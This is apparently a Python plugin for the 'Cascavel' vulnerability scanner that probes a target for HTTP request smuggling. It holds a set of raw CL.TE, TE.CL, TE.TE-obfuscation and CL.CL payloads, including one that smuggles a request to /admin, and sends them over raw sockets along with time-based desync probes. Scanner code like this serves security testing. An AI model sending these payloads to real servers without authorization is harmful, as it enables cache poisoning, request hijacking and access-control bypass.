# plugins/http_smuggling.py — Cascavel 2026 Intelligence
import socket
import time

# ──────────── SMUGGLING PAYLOADS ────────────
SMUGGLE_PAYLOADS = {
    "CL.TE": ("POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"),
    "TE.CL": (
        "POST / HTTP/1.1\r\n"
        "Host: {target}\r\n"
        "Content-Length: 3\r\n"
        "Transfer-Encoding: chunked\r\n\r\n"
        "8\r\nSMUGGLED\r\n0\r\n\r\n"
    ),
    "TE.TE_OBFUSCATION": (
        "POST / HTTP/1.1\r\n"
        "Host: {target}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Transfer-encoding: cow\r\n\r\n"
        "5c\r\nGPOST / HTTP/1.1\r\n\r\n0\r\n\r\n"
    ),
    "CL.CL": ("POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 0\r\nContent-Length: 6\r\n\r\nATTACK"),
    # 2026 additions
    "TE_SPACE": (
        "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 4\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\nG"
    ),
    "TE_TAB": (
        "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 4\r\nTransfer-Encoding:\tchunked\r\n\r\n0\r\n\r\nG"
    ),
    "TE_NEWLINE": (
        "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 4\r\nTransfer-Encoding\r\n : chunked\r\n\r\n0\r\n\r\nG"
    ),
    "TE_COMMA": (
        "POST / HTTP/1.1\r\n"
        "Host: {target}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked, identity\r\n\r\n"
        "0\r\n\r\nG"
    ),
    "TE_XCHUNKED": (
        "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 4\r\nTransfer-Encoding: xchunked\r\n\r\n0\r\n\r\nG"
    ),
    "CL_TE_ADMIN": (
        "POST / HTTP/1.1\r\n"
        "Host: {target}\r\n"
        "Content-Length: 44\r\n"
        "Transfer-Encoding: chunked\r\n\r\n"
        "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {target}\r\n\r\n"
    ),
}

# ──────────── TIME-BASED DETECTION ────────────
TIME_PAYLOADS = {
    "CL.TE_TIME": (
        "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nA\r\nQ"
    ),
    "TE.CL_TIME": (
        "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX"
    ),
}


def _send_raw(target, payload, port=80, timeout=10):
    """Envia payload HTTP raw via socket."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((target, port))
        sock.send(payload.encode())
        response = sock.recv(8192).decode(errors="ignore")
        sock.close()
        return response
    except socket.timeout:
        return "TIMEOUT"
    except Exception:
        return ""


def _analyze_smuggle(response, method):
    """Analisa resposta para sinais de HTTP smuggling."""
    indicators = [
        ("SMUGGLED", "Payload smuggled refletido na resposta"),
        ("GPOST", "Request splitting detectado — GPOST concatenado"),
        ("ATTACK", "CL.CL desync — payload ATTACK processado"),
    ]
    for indicator, desc in indicators:
        if indicator in response:
            return {
                "tipo": "HTTP_SMUGGLING",
                "metodo": method,
                "indicador": indicator,
                "severidade": "CRITICO",
                "descricao": desc,
            }

    # Check for different status codes indicating desync
    if "400 Bad Request" in response and method.startswith("TE"):
        return {
            "tipo": "HTTP_SMUGGLING_POSSIBLE",
            "metodo": method,
            "severidade": "ALTO",
            "descricao": f"400 Bad Request com {method} — possível desync!",
        }
    if "405 Method Not Allowed" in response:
        return {
            "tipo": "HTTP_SMUGGLING_DESYNC",
            "metodo": method,
            "severidade": "CRITICO",
            "descricao": "405 Method Not Allowed — backend recebeu método diferente!",
        }
    return None


def _test_time_based(target, method, payload):
    """Testa HTTP smuggling via time-based detection."""
    formatted = payload.replace("{target}", target)
    start = time.time()
    response = _send_raw(target, formatted, timeout=10)
    elapsed = time.time() - start

    if response == "TIMEOUT" or elapsed > 8:
        return {
            "tipo": "HTTP_SMUGGLING_TIME",
            "metodo": method,
            "tempo": round(elapsed, 2),
            "severidade": "ALTO",
            "descricao": f"Timeout ({elapsed:.1f}s) — possível desync via {method}!",
        }
    return None


def _test_transfer_encoding_support(target):
    """Verifica como o servidor processa Transfer-Encoding."""
    payload = f"GET / HTTP/1.1\r\nHost: {target}\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n"
    response = _send_raw(target, payload)
    if "200 OK" in response or "301" in response:
        return True
    return False


def run(target, ip, open_ports, banners):
    """
    Scanner HTTP Smuggling 2026-Grade — CL.TE, TE.CL, TE.TE, Time-Based.

    Técnicas: 10 smuggling payloads (CL.TE/TE.CL/TE.TE/CL.CL + obfuscation variants),
    TE header obfuscation (space/tab/newline/comma/xchunked),
    admin path smuggling, time-based desync detection,
    raw socket communication, TE support detection.
    Research: PortSwigger Labs, James Kettle HTTP Desync Attacks.
    """
    _ = (ip, open_ports, banners)
    vulns = []

    # Check TE support first
    te_supported = _test_transfer_encoding_support(target)

    # Standard smuggling tests
    for method, template in SMUGGLE_PAYLOADS.items():
        payload = template.replace("{target}", target)
        response = _send_raw(target, payload)
        vuln = _analyze_smuggle(response, method)
        if vuln:
            vulns.append(vuln)

    # Time-based detection
    if te_supported:
        for method, template in TIME_PAYLOADS.items():
            vuln = _test_time_based(target, method, template)
            if vuln:
                vulns.append(vuln)

    return {
        "plugin": "http_smuggling",
        "versao": "2026.1",
        "tecnicas": ["cl_te", "te_cl", "te_te", "cl_cl", "te_obfuscation", "time_based", "admin_smuggle", "raw_socket"],
        "resultados": vulns if vulns else "Nenhum HTTP smuggling detectado",
    }
